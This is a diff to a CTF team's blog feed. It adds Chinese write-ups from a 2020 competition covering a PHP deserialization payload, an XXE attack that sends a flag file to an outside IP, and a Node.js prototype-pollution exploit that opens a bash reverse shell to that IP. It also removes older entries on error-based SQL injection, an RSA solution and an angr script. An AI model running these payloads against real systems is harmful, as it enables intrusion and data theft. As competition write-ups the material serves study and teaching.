@@ -63,6 +63,81 @@
   </entry>
   
   <entry>
+    <title>2020 网鼎杯 AreUSerialz</title>
+    <link href="https://boiteam.github.io/2020/05/11/AreUSerialz/"/>
+    <id>https://boiteam.github.io/2020/05/11/AreUSerialz/</id>
+    <published>2020-05-10T16:00:00.000Z</published>
+    <updated>2020-05-14T03:15:16.209Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $op;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $content;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        $op = <span class="string">"1"</span>;</span></span><br><span class="line"><span class="php">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span></span><br><span class="line"><span class="php">        $content = <span class="string">"Hello World!"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;process();   </span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;write();       </span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span></span><br><span class="line"><span class="php">            $res = <span class="keyword">$this</span>-&gt;read();</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;output($res);</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span></span><br><span class="line"><span class="php">                <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        $res = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span></span><br><span class="line"><span class="php">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $res;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $s;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;process();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$ccc = <span class="keyword">new</span> FileHandler();</span></span><br><span class="line"><span class="php">$ccc-&gt;op=<span class="number">2</span>;</span></span><br><span class="line"><span class="php">$ccc-&gt;filename=<span class="string">'flag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br></pre></td></tr></table></figure><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">11</span>:<span class="string">"FileHandler"</span>:<span class="number">4</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"op"</span>;<span class="string">i:</span><span class="number">2</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"filename"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"flag.php"</span>;<span class="string">s:</span><span class="number">7</span>:<span class="string">"content"</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>直接打就完事了。</p><p>​            <img src="/2020/05/11/AreUSerialz/0.png" alt="img">            </p><p><strong>Flag：flag{85fbed22-e71f-4c1c-ba7b-4174737fa29d}</strong></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;AreUSerialz&quot;&gt;&lt;a href=&quot;#AreUSerialz&quot; class=&quot;headerlink&quot; title=&quot;AreUSerialz&quot;&gt;&lt;/a&gt;AreUSerialz&lt;/h3&gt;
+    
+    </summary>
+    
+    
+      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
+    
+      <category term="Php" scheme="https://boiteam.github.io/categories/Web/Php/"/>
+    
+    
+      <category term="Web_php反序列化" scheme="https://boiteam.github.io/tags/Web-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>2020 网鼎杯 AreUSerialz</title>
+    <link href="https://boiteam.github.io/2020/05/11/filejava/"/>
+    <id>https://boiteam.github.io/2020/05/11/filejava/</id>
+    <published>2020-05-10T16:00:00.000Z</published>
+    <updated>2020-05-14T03:16:25.694Z</updated>
+    
+    <content type="html"><![CDATA[<p>download存在任意文件读取</p><p>​            <img src="/2020/05/11/filejava/0-1589116035784.png" alt>            </p><p>导出class，jd-gui反编译后查看上传的源码可以看到存在xxe漏洞</p><p>​            <img src="/2020/05/11/filejava/0-1589116038020.png" alt>            </p><p>我们上传文件名为excel-xxxx.xlsx的excel才会进行相应的处理，关于excel其实也是一个压缩文件，我们可以直接用压缩软件打开，而最主要的地方就是里面的[Content_Types].xml文件，这儿我们直接用xml外带数据即可</p><p>1、</p><p>[Content_Types].xml中插入XXE代码</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://49.232.1.225/evil.xml"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="perl">%remote;</span></span><br><span class="line"></span><br><span class="line"><span class="perl">%all;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2、在服务器中放入evil.xml,内容如下，这样就会访问服务器的xml文件，然后将本地的flag文件内容以传参的形式传到服务器监听的端口中</p><p>evil.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY send SYSTEM 'http://49.232.1.225/1.php?file=%file;'&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3、上传查看日志</p><p>​            <img src="/2020/05/11/filejava/0-1589116045062.png" alt>            </p><p><strong>Flag：flag{edea8805-7a7a-4adf-b411-634862b049f9}</strong></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;download存在任意文件读取&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
+    
+      <category term="Java" scheme="https://boiteam.github.io/categories/Web/Java/"/>
+    
+    
+      <category term="Web_XXE" scheme="https://boiteam.github.io/tags/Web-XXE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>2020 网鼎杯 AreUSerialz</title>
+    <link href="https://boiteam.github.io/2020/05/11/notes/"/>
+    <id>https://boiteam.github.io/2020/05/11/notes/</id>
+    <published>2020-05-10T16:00:00.000Z</published>
+    <updated>2020-05-14T03:17:39.187Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h3><p>这道题主要考察的是js原型链污染，首先是引入的包undefsafe存在原形链污染</p><p>参考：<a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">"undefsafe"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">"__proto__.toString"</span>;</span><br><span class="line"></span><br><span class="line">a(&#123;&#125;,payload,<span class="string">"JHU"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.toString);</span><br></pre></td></tr></table></figure><p>然后我们查看源代码，可以看见有个命令执行，所以我们所需要做的就是污染commands数组</p><p>​           <img src="/2020/05/11/notes/0-1589116047941.png" alt>            </p><p>根据上文，我们选择/edit_note路由，三个参数都可控,构造</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">url1</span> = <span class="string">"http://ef35ba3c6f1945798a3ae0f34ea3c2ae33a62a52d66348e6.changame.ichunqiu.com:8080/edit_note"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">url2</span> = <span class="string">"http://ef35ba3c6f1945798a3ae0f34ea3c2ae33a62a52d66348e6.changame.ichunqiu.com:8080/status"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">req1</span> = requests.post(url = url1, json = &#123;<span class="string">'id'</span>: <span class="string">'__proto__'</span>, <span class="string">'author'</span>: <span class="string">'cccc'</span>,<span class="string">'raw'</span>: <span class="string">'bash -i &gt;&amp; /dev/tcp/49.232.1.225/8888 0&gt;&amp;1'</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="attr">req2</span> = requests.get(url = url2)</span><br></pre></td></tr></table></figure><p>最后拼接执行的语句为</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">undefsafe(this.note_list, '__proto__' + '.author', 'bash -i &gt;&amp; /dev/tcp/<span class="number">49.232</span><span class="number">.1</span><span class="number">.225</span>/<span class="number">8888</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>' )</span><br></pre></td></tr></table></figure><p>这样就能造成原型链污染,如</p><p><img src="/2020/05/11/notes/0-1589116051305.png" alt>            </p><p>访问/status路由，直接反弹shell，得到flag</p><p><img src="/2020/05/11/notes/0-1589116054184.png" alt>                        </p><p><strong>Flag：flag{5bad9a50-85e9-407d-aed2-786d11bed46c}</strong></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;notes&quot;&gt;&lt;a href=&quot;#notes&quot; class=&quot;headerlink&quot; title=&quot;notes&quot;&gt;&lt;/a&gt;notes&lt;/h3&gt;
+    
+    </summary>
+    
+    
+      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
+    
+      <category term="Nodejs" scheme="https://boiteam.github.io/categories/Web/Nodejs/"/>
+    
+    
+      <category term="Web_原型链污染" scheme="https://boiteam.github.io/tags/Web-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
+    
+  </entry>
+  
+  <entry>
     <title>2020 网鼎杯 boom</title>
     <link href="https://boiteam.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF_%E5%AF%86%E7%A0%811/"/>
     <id>https://boiteam.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF_%E5%AF%86%E7%A0%811/</id>
@@ -420,77 +495,6 @@
     
     
       <category term="Web_SSRF" scheme="https://boiteam.github.io/tags/Web-SSRF/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>2020 易林博“停课不停赛，以赛促学” SQLI</title>
-    <link href="https://boiteam.github.io/2020/03/29/SQLI/"/>
-    <id>https://boiteam.github.io/2020/03/29/SQLI/</id>
-    <published>2020-03-28T16:00:00.000Z</published>
-    <updated>2020-03-30T02:10:27.908Z</updated>
-    
-    <content type="html"><![CDATA[<p>这个页面太丑了，三个功能，注册、登入、改密码，一般这种涉及多次数据库操作的基本都是二次注入。测试用户名处</p><blockquote><p>注册用户：ccc”</p><p>密码：ccc</p></blockquote><p>改密码的时候报错了</p><p><img src="/2020/03/29/SQLI/image-20200327151345433.png" alt="image-20200327151345433"></p><p>多测试测试，过来了空格、/*、and……直接报错注入最方便了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ccc"||updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="keyword">database</span>())),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">ccc<span class="string">"||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=flag)&amp;(table_schema=database())),0x7e),1)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ccc"</span>||updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span>(flag)<span class="keyword">from</span>(flag)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;这个页面太丑了，三个功能，注册、登入、改密码，一般这种涉及多次数据库操作的基本都是二次注入。测试用户名处&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
-    
-      <category term="php" scheme="https://boiteam.github.io/categories/Web/php/"/>
-    
-    
-      <category term="Web_二次注入" scheme="https://boiteam.github.io/tags/Web-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>2020 易林博“停课不停赛，以赛促学” EasyRsa</title>
-    <link href="https://boiteam.github.io/2020/03/29/EasyRsa/"/>
-    <id>https://boiteam.github.io/2020/03/29/EasyRsa/</id>
-    <published>2020-03-28T16:00:00.000Z</published>
-    <updated>2020-03-30T02:50:49.846Z</updated>
-    
-    <content type="html"><![CDATA[<p>热身题，直接给了私钥，但是有一些迷惑性的信息</p><p><img src="/2020/03/29/EasyRsa/image-20200330100636601.png" alt="image-20200330100636601"></p><p>2两个1024bit，5个512bit，用俩大数模小数，得到的值是0的即为p,q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pmq <span class="keyword">import</span> *</span><br><span class="line">x1=int(<span class="string">'''00 E5 27 56 BF EB</span></span><br><span class="line"><span class="string">DA 06 F1 E7 C5 7C 4C 27  87 60 8F E7 1E C1 1F DE</span></span><br><span class="line"><span class="string">1B BF 7A 4A 0C A7 82 46  36 5D 03 AE 68 EB 87 97</span></span><br><span class="line"><span class="string">8A 33 61 DD 0F D9 F3 07  BF 35 52 CB 4D A7 83 B8</span></span><br><span class="line"><span class="string">3F 06 BF CE ED 62 7E 35  4C C7 41 AD A1 C8 F6 4C</span></span><br><span class="line"><span class="string">44 3F DD 01 44 F8 F2 C2  F4 C3 85 1F 1F 96 B8 89</span></span><br><span class="line"><span class="string">7D 04 B7 2A 1C 39 FC 34  2E B2 87 E9 D4 84 1D 30</span></span><br><span class="line"><span class="string">99 F6 45 96 DF 4A DF B1  84 B5 11 87 8B 3F 0C 4C</span></span><br><span class="line"><span class="string">94 2C A9 92 0F FB 7F 99  47 1E 05'''</span>.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>),<span class="number">16</span>)</span><br><span class="line">x3=int(<span class="string">'''00 F7 27  15 97 1B 35 84 F9 40 0D</span></span><br><span class="line"><span class="string">95 61 B9 62 D2 39 09 D9  8F 74 F5 38 4C AF C1 96</span></span><br><span class="line"><span class="string">79 38 20 8D B6 6A C8 04  9F 27 93 09 D3 7A 31 56</span></span><br><span class="line"><span class="string">74 27 A8 46 4D B4 CD D1  60 14 B6 08 0D 5F 72 F7</span></span><br><span class="line"><span class="string">75 60 F7 F7 97 47'''</span>.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>),<span class="number">16</span>)</span><br><span class="line">x4=int(<span class="string">'''00 ED 5B 4F 9E C8 14 02</span></span><br><span class="line"><span class="string">51 58 42 0D 73 34 07 89  B2 1E 85 C0 09 AA BD 04</span></span><br><span class="line"><span class="string">EE 4F 37 E1 EC 6C B7 8B  37 AF D7 30 42 4C 53 BA</span></span><br><span class="line"><span class="string">8C 16 75 14 EC 0E C9 7D  FD 77 C6 CD 09 6E 56 49</span></span><br><span class="line"><span class="string">55 4E 7B 68 5F E6 63 5E  53'''</span>.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=x3</span><br><span class="line">q=x4</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=int(open(<span class="string">r'C:\Users\Administrator\Desktop\EasyRSA\flag.en'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(M(e,p,q,c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'666c61677b57653163306d6543746633725f656c61627d0a'</span>.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;热身题，直接给了私钥，但是有一些迷惑性的信息&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="Crypto" scheme="https://boiteam.github.io/categories/Crypto/"/>
-    
-    
-      <category term="Crypto_RSA算法原理" scheme="https://boiteam.github.io/tags/Crypto-RSA%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>2020 易林博“停课不停赛，以赛促学” vm</title>
-    <link href="https://boiteam.github.io/2020/03/29/vm/"/>
-    <id>https://boiteam.github.io/2020/03/29/vm/</id>
-    <published>2020-03-28T16:00:00.000Z</published>
-    <updated>2020-03-30T02:40:22.209Z</updated>
-    
-    <content type="html"><![CDATA[<p>这是一个C语言虚拟机题，而且也没开地址随机化，于是直接想到angr自动化解题<br><strong>第一层考点：angr框架使用</strong></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line">proj = angr.Project(<span class="string">"./vm"</span>)</span><br><span class="line"><span class="keyword">state</span> = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(<span class="keyword">state</span>)</span><br><span class="line">simgr.explore(find=<span class="number">0</span>x4009BC,avoid=<span class="number">0</span>x4008C7)</span><br><span class="line">print (simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>​                                </p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;这是一个C语言虚拟机题，而且也没开地址随机化，于是直接想到angr自动化解题&lt;br&gt;&lt;strong&gt;第一层考点：angr框架使用&lt;/strong&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
-    
-    
-      <category term="Re_angr的使用" scheme="https://boiteam.github.io/tags/Re-angr%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
     
   </entry>
   
